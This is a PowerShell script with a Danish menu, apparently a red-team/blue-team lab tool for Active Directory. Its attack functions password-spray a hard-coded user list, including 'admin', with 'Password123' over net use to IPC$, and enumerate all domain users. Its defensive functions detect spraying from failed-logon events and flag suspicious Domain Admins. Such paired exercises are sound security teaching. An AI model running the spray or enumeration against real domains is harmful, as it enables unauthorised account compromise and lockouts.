Import-Module ActiveDirectory

# KONFIGURATION
$Config = @{
    PasswordSprayPassword = "Password123"
    SprayUsers = @("Testuser1", "Testuser2", "Testuser3", "admin")
    Threshold = 5 
    TimeWindowMinute = 10 
}


# LOGGING
function Write-Log {
    param($Type, $Message)

    $log = [PSCustomObject]@{
        Time    = Get-Date
        Type    = $Type
        Message = $Message
    }

    $log | ConvertTo-Json -Compress | Out-File ".\ad-log.json" -Append
}

# ALERT
function Send-Alert {
    param ($Message)

    Write-Host "ALERT: $Message" -ForegroundColor Red
    Write-Log "ALERT" $Message
}


# RED TEAM
function Invoke-PasswordSpray {
    param ($Users, $Password)

    Write-Host "`n Starter Password Spray..." -ForegroundColor Yellow

    foreach ($user in $Users) {
        try {
            net use \\localhost\ipc$ /user:$env:USERDOMAIN\$user $Password 2>$null
            Write-Host "Forsøgt login: $user"
        } catch {}
    }

    Write-Log "ATTACK" "Password spray executed"
}

function Invoke-UserEnumeration {
    Write-Host "`n Enumerating users..." -ForegroundColor Yellow

    $users = Get-ADUser -Filter *
    foreach ($user in $users) {
        Write-Host $user.SamAccountName
    }

    Write-Log "ATTACK" "User enumeration executed"
}

# BLUE TEAM
function Get-FailedLogins {
    Get-WinEvent -FilterHashtable @{
        LogName = 'Security'
        ID = 4625
        StartTime = (Get-Date).AddMinutes(-$Config.TimeWindowMinute)
    }
}

function Get-SuccessLogins {
    Get-WinEvent -FilterHashtable @{
        LogName = 'Security'
        ID = 4624
        StartTime = (Get-Date).AddMinutes(-$Config.TimeWindowMinute)
    }
}

function Detect-PasswordSpray {
    param ($Events)

    $grouped = $Events | Group-Object { $_.Properties[5].Value }

    foreach ($group in $grouped) {
        if ($group.Count -ge $Config.Threshold) {
            return $true
        }
    }

    return $false
}

function Detect-NewAdmins {
    $admins = Get-ADGroupMember "Domain Admins"

    foreach ($admin in $admins) {
        if ($admin.Name -like "*test*") {
            return $true
        }
    }

    return $false
}

# INCIDENT HANDLER
function Handle-Incident {
    param ($Severity, $Message)

    switch ($Severity) {
        "INFO"     { Write-Log "INFO" $Message }
        "WARNING"  { Write-Log "WARNING" $Message }
        "CRITICAL" { Send-Alert $Message }
    }
}

# MENU
function Show-Menu {
    Write-Host "`n AD Security Tool " -ForegroundColor Cyan
    Write-Host "1. Password Spray Attack"
    Write-Host "2. User Enumeration"
    Write-Host "3. Run Detection"
    Write-Host "4. Continuous Monitoring"
    Write-Host "5. Exit"
}


# MONITORING
function Start-Monitoring {
    while ($true) {

        Write-Host "`n🔄 Monitoring AD..." -ForegroundColor Cyan

        $failed = Get-FailedLogins

        if (Detect-PasswordSpray $failed) {
            Handle-Incident "CRITICAL" "Password spray detected!"
        }

        if (Detect-NewAdmins) {
            Handle-Incident "CRITICAL" "Suspicious admin account detected!"
        }

        Start-Sleep -Seconds 60
    }
}


# MAIN LOOP
while ($true) {

    Show-Menu
    $choice = Read-Host "Vælg en option"

    switch ($choice) {

        "1" {
            Invoke-PasswordSpray -Users $Config.SprayUsers -Password $Config.PasswordSprayPassword
        }

        "2" {
            Invoke-UserEnumeration
        }

        "3" {
            $failed = Get-FailedLogins

            if (Detect-PasswordSpray $failed) {
                Handle-Incident "CRITICAL" "Password spraying detected"
            } else {
                Write-Host "Ingen angreb fundet"
            }
        }

        "4" {
            Start-Monitoring
        }

        "5" {
            break
        }

        default {
            Write-Host "Ugyldigt valg"
        }
    }
}